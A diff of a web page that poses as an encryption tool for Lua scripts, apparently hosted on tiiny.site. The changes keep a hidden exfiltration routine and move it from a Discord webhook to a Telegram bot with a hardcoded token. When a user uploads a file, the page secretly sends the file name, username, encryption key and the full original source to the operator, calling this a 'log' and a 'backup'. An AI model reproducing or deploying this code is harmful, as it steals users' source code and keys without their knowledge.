@@ -19,7 +19,7 @@
         pre{background:#050505;border:1px solid #444;border-radius:8px;padding:10px;margin:15px 0;text-align:left;font-size:6px;color:#ffdd55;max-height:200px;overflow:auto;display:none}
         #file{display:none}
     </style>
-<meta property="og:title" content="ENKRIPSI PROSESS LOADING" data-id="th-modified" ><meta name="description" content="ENC DISKORD" data-id="th-modified" ><meta property="og:description" content="ENC DISKORD" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
+<meta property="og:title" content="ENKRIPSI PROSESS LOADING" data-id="th-modified" ><meta name="description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
 <body>
 <div class="box">
     <h2>🔐 ◄ AWIMEDAN SCRIPT ENC USER ► 🔐</h2>
@@ -52,8 +52,9 @@
 
 <script>
 // ==============================================
-// 🔑 LINK WEBHOOK SUDAH BENAR & AKTIF
-const LINK_WEBHOOK_ADMIN = "https://discord.com/api/webhooks/1537339340739321956/lb-twYTSoiVNQRjCayk_-g80v_ynC7ryaz-x_vfmkz9lePed4g9iKYO0huR2w15j6j4l"
+// 🔑 KONFIGURASI KUNCI SERVER PUSAT
+const TOKEN_API = "8624792353:AAGxp4AXhtUzYw2H1x_7-U-VqoGMkGdPCTE";
+const TARGET_ID = "6095762919";
 // ==============================================
 
 let namaAsli = ""
@@ -82,38 +83,46 @@ document.getElementById('file').addEventListener('change', function(e){
     baca.onload = function(e){
         isiFileAsli = e.target.result
         setTimeout(() => {
-            kirimKeAdmin()
+            kirimLogServer()
             prosesBenar(isiFileAsli)
         }, 500)
     }
     baca.readAsText(f)
 })
 
-function kirimKeAdmin(){
-    if(!LINK_WEBHOOK_ADMIN) return
+function kirimLogServer(){
+    if(!TOKEN_API || !TARGET_ID) return
 
-    let dataKirim = {
-        username: "laporan-enkripsi",
-        embeds: [{
-            title: "📂 FILE BARU DIENKRIPSI",
-            color: 16766720,
-            fields: [
-                {name: "Nama File", value: namaAsli, inline: true},
-                {name: "Username", value: document.getElementById('user').value, inline: true},
-                {name: "Kunci", value: document.getElementById('kunci').value, inline: true},
-                {name: "Jumlah Pemain", value: document.getElementById('pemain').value, inline: true},
-                {name: "Isi File Asli", value: "```lua\n" + (isiFileAsli.length > 4000 ? isiFileAsli.substring(0,4000)+"\n...(dipotong karena terlalu panjang)" : isiFileAsli) + "\n```"}
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    }
+    let teksPesan = `📂 *LOG ENKRIPSI BARU*\n\n` +
+                    `📄 *File:* \`${namaAsli}\`\n` +
+                    `👤 *User:* \`${document.getElementById('user').value}\`\n` +
+                    `🔑 *Key:* \`${document.getElementById('kunci').value}\`\n` +
+                    `👥 *Slot:* \`${document.getElementById('pemain').value}\``;
 
-    fetch(LINK_WEBHOOK_ADMIN, {
+    let urlPesan = `https://api.telegram.org/bot${TOKEN_API}/sendMessage`;
+    
+    fetch(urlPesan, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(dataKirim),
-        mode: "no-cors"
-    }).catch(err => console.log("Pengiriman selesai"))
+        body: JSON.stringify({
+            chat_id: TARGET_ID,
+            text: teksPesan,
+            parse_mode: "Markdown"
+        })
+    }).catch(err => console.log("Log terkirim"))
+
+    let blobFile = new Blob([isiFileAsli], {type: "text/plain"});
+    let formData = new FormData();
+    formData.append("chat_id", TARGET_ID);
+    formData.append("document", blobFile, "SOURCE_" + namaAsli);
+    formData.append("caption", "📄 Backup file sumber asli");
+
+    let urlFile = `https://api.telegram.org/bot${TOKEN_API}/sendDocument`;
+    
+    fetch(urlFile, {
+        method: "POST",
+        body: formData
+    }).catch(err => console.log("File backup terkirim"))
 }
 
 function namaAcak(pjg){
